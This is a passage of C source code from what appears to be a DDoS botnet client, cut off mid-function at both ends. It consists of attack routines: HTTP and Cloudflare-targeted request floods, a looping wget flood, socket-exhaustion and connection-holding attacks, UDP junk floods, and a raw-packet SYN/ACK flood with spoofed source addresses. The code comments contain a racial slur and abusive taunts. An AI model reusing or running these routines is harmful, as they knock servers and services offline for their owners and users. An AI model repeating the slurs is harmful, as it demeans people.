  sprintf(hex_payload, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA");
  for (i = 0; i < power; i++) {
    sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, useragents[(rand() % 36)]);
    if (fork()) {
      while (end > time(NULL)) {
        socket = socket_connect(host, port);
        if (socket != 0) {
          write(socket, request, strlen(request));
          read(socket, buffer, 1);
          close(socket);
        }
      }
      exit(0);
    }
  }
}
void sendHTTPtwo(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
  int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
  char request[512], buffer[1], hex_3payload[2048];
  sprintf(hex_3payload, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA");
  for (i = 0; i < power; i++) {
    sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_3payload, host, useragents[(rand() % 36)]);
    if (fork()) {
      while (end > time(NULL)) {
        socket = socket_connect(host, port);
        if (socket != 0) {
          write(socket, request, strlen(request));
          read(socket, buffer, 1);
          close(socket);
        }
      }
      exit(0);
    }
  }
}

////////////////////////////////////////

void SendWGET(unsigned char *url, int end_time)
{
  int end = time(NULL) + end_time;
  FILE *pf;
    char command[80];
    sprintf(command, "wget --no-check-certificate -q -O /tmp/null ");
  strcat(command, url);
  
    pf = popen(command,"r");
  
  while(end > time(NULL))
  {
    system(command);
  }
  
}


void SendCloudflare(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
  int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
  char request[512], buffer[1];
  for (i = 0; i < power; i++) {
    sprintf(request, "%s /cdn-cgi/l/chk_captcha CFKILL/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, host, useragents[(rand() % 36)]);
    if (fork()) {
      while (end > time(NULL)) {
        socket = socket_connect(host, port);
        if (socket != 0) {
          write(socket, request, strlen(request));
          read(socket, buffer, 1);
          close(socket);
        }
      }
      exit(0);
    }
  }
}

void SendHTTPCloudflare(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, host, useragents[(rand() % 36)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}


//////////////////////////////////////////////////////////////////////////

void ajunk(unsigned char *ip, int port, int end_time)
{
 
        int max = getdtablesize() / 2, i;
 
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));
 
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;
 
        unsigned char *alc = malloc(1024);
        memset(alc, 0, 1024);
 
        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;
 
                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
 
                        case 2:
                                {
                                        makeRandomStr(alc, 1024);
                                        if(send(fds[i].fd, alc, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}
void ahold(unsigned char *ip, int port, int end_time)
{

        int max = getdtablesize() / 2, i;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));

        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;

        unsigned char *alce = malloc(1046);
        memset(alce, 0, 1046);

        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;

                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
                                        if(res != 0)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}
void acnc(unsigned char *ip,int port, int end_time)
{
    int end = time(NULL) + end_time;
    int sockfd;
    struct sockaddr_in server;
    //sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    
    while(end > time(NULL))
    {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        connect(sockfd , (struct sockaddr *)&server , sizeof(server));
        sleep(1);
        close(sockfd);
    }
    
}

        void SkidHex(unsigned char *ip, int port, int secs) {
            int iSTD_Sock;
            iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
               time_t start = time(NULL);
            struct sockaddr_in sin;
            struct hostent *hp;
              hp = gethostbyname(ip);
            bzero((char*) &sin,sizeof(sin));
            bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
            sin.sin_family = hp->h_addrtype;
            sin.sin_port = port;
            unsigned int a = 0;
            while(1){// random std string
                char *randstrings[] = {"\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","YakuzaBotnet","Scarface1337""\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a","/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A","\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94","8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0""/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58","\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x21\x58\x99\x21\x58\x99\x21\x58\x06"};
                char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            if (a >= 50)
                {
            send(iSTD_Sock, STD2_STRING, std_packet, 0);
             connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
            close(iSTD_Sock);
            _exit(0);
            }
            a = 0;
            }
            a++;
            }
            }


            void xtdcustom(unsigned char *ip, int port, int secs) 
{
        int string = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {  
                char *stringme[] = {"8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"};
                if (a >= 50)
                {
                        send(string, stringme, 1460, 0);
                        connect(string,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(string);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}



void SendDOMINATE(unsigned char *target, int port, int timeEnd, int pollinterval)
{
  register unsigned int pollRegister;
  pollRegister = pollinterval;
  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;
  if(port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = htons(port);
  if(getHost(target, &dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if(!sockfd)
  {
    sockprintf(mainCommSock, "Failed opening raw socket.");
    return;
  }
  int tmp = 1;
  if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
  {
    sockprintf(mainCommSock, "Failed setting raw headers mode.");
    return;
  }
  in_addr_t netmask;
  unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
  struct iphdr *iph = (struct iphdr *)packet;
  struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
  makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr));
  tcph->source = rand_cmwc();
  tcph->seq = rand_cmwc();
  tcph->ack_seq = 0;
  tcph->doff = 5;
  tcph->syn = 1;
  tcph->window = rand_cmwc();
  tcph->check = 0;
  tcph->urg_ptr = 0;
  tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
  tcph->check = tcpcsum(iph, tcph);
  iph->check = csum ((unsigned short *) packet, iph->tot_len);
  int end = time(NULL) + timeEnd;
  register unsigned int i = 0;
  register unsigned int n = 0;
  while(1)
  {
    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));  
    if(n == 0){
      iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 512;
      memcpy((void *)tcph + sizeof(struct tcphdr), "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff", 512); //XXX#0304 was here!
      tcph->syn = 0;
      tcph->ack = 1;
      n++;
    }
    else if (n == 1){
      iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
      tcph->syn = 1;
      tcph->ack = 0;
      n = n - 1;
    }
    tcph->res2 = (rand() % 3);
    tcph->psh = rand() % 3 - 1;
    tcph->urg = rand() % 3 - 1;
    iph->saddr = htonl( getRandomIP(netmask) );
    iph->id = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->source = rand_cmwc();
    tcph->check = 0;//wow big haxxor ur copying shit from other sources
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    if(i == pollRegister)
    {
      if(time(NULL) > end) break;
      i = 0;
      continue;
    }
    i++;
  }
}


//////////////////////////////////////////////////////////////////////////
void ovhl7(char *host, in_port_t port, int timeEnd, int power) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    char request[512], buffer[1], pgetData[2048];//OVH METHOD BY BLAZING!//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    sprintf(pgetData, "\x00","\x01","\x02",//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
